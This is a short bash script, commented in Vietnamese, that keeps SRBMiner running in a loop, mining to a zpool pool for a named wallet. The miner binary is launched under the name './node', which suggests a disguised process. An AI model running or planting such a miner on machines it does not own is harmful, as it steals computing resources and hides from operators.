#!/bin/bash

# Đặt lại các biến
POOL="xelisv2-pepew.na.mine.zpool.ca:4833"
WALLET="R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q"
PASSWORD="c=RVN"
ALGO="xelishashv2_pepew"



# Đảm bảo SRB Miner luôn chạy
while true; do
    ./node --algorithm $ALGO --pool $POOL --wallet $WALLET --password $PASSWORD --keepalive true
    sleep 5 
# Tạm dừng 5 giây trước khi thử lại nếu miner bị dừng
done

